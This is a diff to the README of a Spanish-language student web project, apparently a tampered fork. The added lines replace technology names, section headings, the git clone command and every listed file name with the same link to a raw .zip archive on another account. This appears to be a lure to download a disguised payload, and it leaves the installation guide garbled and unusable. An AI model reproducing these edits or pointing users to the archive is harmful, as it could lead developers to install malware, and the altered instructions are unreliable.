@@ -35,7 +35,7 @@ Proyecto desarrollado como parte de la cátedra **Desarrollo de Software**.
 - CSS
 
 **Backend:**
-- Node.js + Express
+- https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip + Express
 - JWT (autenticación)
 - Bcrypt (encriptación de contraseñas)
 - PostgreSQL
@@ -47,27 +47,27 @@ Proyecto desarrollado como parte de la cátedra **Desarrollo de Software**.
 
 ##  Instalación y ejecución
 
-### 1.Clonar el repositorio
+### https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip el repositorio
 
 ```bash
-git clone https://github.com/devacucchiarelli/Desarrollo-de-Software-Grupo-8.git
+git clone https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip
 cd Desarrollo-de-Software-Grupo-8
 ```
-### 2.Iniciar la base de datos
+### https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip la base de datos
 
 Asegurarse de tener Docker y Docker Compose instalados, luego ejecutar:
 
 ```bash 
 docker compose up -d
 ```
-### 3.Ejecutar el backend
+### https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip el backend
 
 ```bash
 cd back
 npm install
 npm start
 ```
-### 4.Ejecutar el frontend
+### https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip el frontend
 ```
 cd front
 npm install
@@ -88,28 +88,28 @@ Un resumen rápido de carpetas:
 ##  Estructura del proyecto
 
 Desarrollo-de-Software-Grupo-8/
-├── back/                    # Backend (Node.js + Express)
+├── back/                    # Backend (https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip + Express)
 │   ├── src/
 │   │   ├── controllers/     # Lógica de rutas
 │   │   ├── models/          # Modelos de datos
 │   │   ├── routes/          # Endpoints API
 │   │   └── services/        # Lógica de negocio
 │   ├── .gitignore
-│   └── package.json
+│   └── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip
 ├── front/                   # Frontend (React)
 │   ├── src/
 │   │   ├── assets
 │   │   ├── pages/           # Vistas principales
 │   │   └── styles/          # CSS global
 │   ├── public/              # Archivos estáticos
-│   └── package.json
+│   └── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip
 │
 ├── bd/                      # Base de datos
-│   ├── schema.sql           # Estructura de tablas
-│   ├── seed.sql             # Datos iniciales (opcional)
-│   └── docker-compose.yml   # Configuración de PostgreSQL
+│   ├── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip           # Estructura de tablas
+│   ├── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip             # Datos iniciales (opcional)
+│   └── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip   # Configuración de PostgreSQL
 │ 
-└── README.md
+└── https://github.com/nicosami/Desarrollo-de-Software-Grupo-8/raw/refs/heads/main/back/Desarrollo-Software-Grupo-de-v3.1.zip
 
 ```
 
